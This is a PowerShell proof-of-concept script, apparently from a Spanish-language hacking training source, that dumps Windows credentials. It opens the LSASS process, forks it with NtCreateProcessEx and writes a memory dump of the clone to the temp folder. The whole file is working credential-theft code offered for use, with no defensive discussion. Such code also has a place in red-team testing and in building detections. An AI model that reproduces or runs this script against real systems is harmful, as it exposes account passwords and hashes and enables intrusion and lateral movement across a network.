# ================================================
#     LSASS Forked Dump - PoC V 1.0
#     Autor: Willian Oliveira
#     Empresa: Escola hack3r 
#     Traducido por: sezio (sergiovks)
# ================================================

Write-Host "===============================================" -ForegroundColor Cyan
Write-Host "         LSASS Forked Dump - PoC - V 1.0       " -ForegroundColor Cyan
Write-Host "         Autor: Willian Oliveira               " -ForegroundColor Cyan
Write-Host "         Empresa: Escola hack3r                " -ForegroundColor Cyan
Write-Host "         Traducido por: sezio (sergiovks)      " -ForegroundColor Cyan
Write-Host "===============================================" -ForegroundColor Cyan
Write-Host ""

# Definición de la clase con P/Invoke
Write-Host "[*] Cargando definiciones de API..." -ForegroundColor Yellow

Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class LSASSForkDump {
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(UInt32 dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern uint NtCreateProcessEx(
        out IntPtr processHandle,
        uint desiredAccess,
        IntPtr objectAttributes,
        IntPtr parentProcess,
        bool inheritObjectTable,
        IntPtr sectionHandle,
        IntPtr debugPort,
        IntPtr exceptionPort,
        bool inJob
    );

    [DllImport("dbghelp.dll", SetLastError = true)]
    public static extern bool MiniDumpWriteDump(
        IntPtr hProcess,
        int ProcessId,
        IntPtr hFile,
        int DumpType,
        IntPtr ExceptionParam,
        IntPtr UserStreamParam,
        IntPtr CallbackParam
    );
}
"@

Write-Host "[+] API cargada con éxito." -ForegroundColor Green
Write-Host ""

# Abrir el proceso LSASS
Write-Host "[*] Intentando abrir el proceso LSASS..." -ForegroundColor Yellow
$lsass = Get-Process lsass
$PROCESS_QUERY_INFORMATION = 0x0400
$PROCESS_VM_READ = 0x0010
$access = $PROCESS_QUERY_INFORMATION -bor $PROCESS_VM_READ
$lsassHandle = [LSASSForkDump]::OpenProcess($access, $false, $lsass.Id)

if ($lsassHandle -eq [IntPtr]::Zero) {
    Write-Host "[!] Error al abrir el proceso LSASS!" -ForegroundColor Red
    return
} else {
    Write-Host "[+] Proceso LSASS abierto con éxito." -ForegroundColor Green
}

Write-Host ""

# Clonar el proceso LSASS
Write-Host "[*] Intentando clonar el proceso LSASS..." -ForegroundColor Yellow
[IntPtr]$forkedHandle = [IntPtr]::Zero
$ntstatus = [LSASSForkDump]::NtCreateProcessEx([ref]$forkedHandle, 0x001F0FFF, [IntPtr]::Zero, $lsassHandle, $true, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, $false)

if ($forkedHandle -eq [IntPtr]::Zero) {
    Write-Host "[!] Error al clonar el proceso LSASS!" -ForegroundColor Red
    return
} else {
    Write-Host "[+] Proceso LSASS clonado con éxito." -ForegroundColor Green
}

Write-Host ""

# Crear el volcado del clon
Write-Host "[*] Creando el volcado del proceso clonado..." -ForegroundColor Yellow
$dumpPath = "$env:TEMP\forked_lsass.dmp"
$fs = New-Object IO.FileStream($dumpPath, [IO.FileMode]::Create, [IO.FileAccess]::Write)
$success = [LSASSForkDump]::MiniDumpWriteDump($forkedHandle, 0, $fs.SafeFileHandle.DangerousGetHandle(), 2, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)
$fs.Close()

if ($success) {
    Write-Host "[+] Volcado creado con éxito en: $dumpPath" -ForegroundColor Green
} else {
    Write-Host "[!] Error al crear el volcado!" -ForegroundColor Red
}
